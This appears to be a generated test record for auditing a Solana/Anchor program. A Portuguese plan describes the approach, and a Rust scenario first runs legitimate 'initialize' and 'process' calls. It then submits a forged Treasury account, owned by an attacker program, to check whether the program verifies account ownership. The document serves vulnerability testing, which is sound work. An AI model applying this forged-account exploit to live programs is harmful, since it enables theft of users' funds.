{"plan": "O cenário inicializa uma conta Treasury legítima via `initialize`, com authority = carteira legítima. O baseline chama `process` com a Treasury legítima e a authority correta (deve ter sucesso). O ataque chama `process` passando uma Treasury forjada (dono diferente do programa, ex.: attacker_program) com authority = atacante, mantendo a mesma posição de conta do baseline. O efeito mede se a conta forjada foi aceita: se o ataque tiver sucesso, o dono da conta na posição da treasury difere do program_id, demonstrando que o programa não verificou o dono da conta.", "scenario": "let authority = Pubkey::new_unique();
let treasury_key = Pubkey::new_unique();

let treasury_data = anchor_account_data("Treasury", &(authority, 100u64, true));
let treasury_account = account(&env.program_id, &treasury_data, None);
let authority_account = wallet(1_000_000_000);

let init_ix = env.anchor_ix(
    "initialize",
    &(100u64,),
    vec![
        AccountMeta::new(treasury_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);

let init_accounts = vec![
    (treasury_key, empty_account()),
    (authority, authority_account.clone()),
    system_program_account(),
];

let init_result = env.baseline("initialize treasury", &init_ix, &init_accounts);

let treasury_after_init = after(&init_result, &treasury_key).clone();

let baseline_ix = env.anchor_ix(
    "process",
    &(),
    vec![
        AccountMeta::new_readonly(treasury_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);

let baseline_accounts = vec![
    (treasury_key, treasury_after_init.clone()),
    (authority, authority_account.clone()),
];

let baseline_result = env.baseline("process legitimo", &baseline_ix, &baseline_accounts);

let attacker = Pubkey::new_unique();
let forged_treasury_key = Pubkey::new_unique();
let forged_data = anchor_account_data("Treasury", &(attacker, 999u64, true));
let forged_owner = env.attacker_program.unwrap_or(Pubkey::new_unique());
let forged_treasury = account(&forged_owner, &forged_data, None);
let attacker_account = wallet(1_000_000_000);

let attack_ix = env.anchor_ix(
    "process",
    &(),
    vec![
        AccountMeta::new_readonly(forged_treasury_key, false),
        AccountMeta::new_readonly(attacker, true),
    ],
);

let attack_accounts = vec![
    (forged_treasury_key, forged_treasury),
    (attacker, attacker_account),
];

let attack_result = env.attack("process com treasury forjada", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let owner_after = after(&attack_result, &forged_treasury_key).owner();
    env.effect(
        "conta forjada com dono diferente do programa foi aceita",
        *owner_after != env.program_id,
    );
}"}

